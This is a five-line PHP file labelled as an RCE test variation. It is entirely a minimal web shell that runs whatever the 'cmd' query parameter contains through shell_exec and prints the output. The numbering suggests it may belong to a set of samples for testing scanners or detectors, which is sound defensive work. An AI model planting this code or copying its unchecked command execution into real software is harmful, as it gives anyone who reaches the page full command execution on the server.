<?php
// RCE test variation #504
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>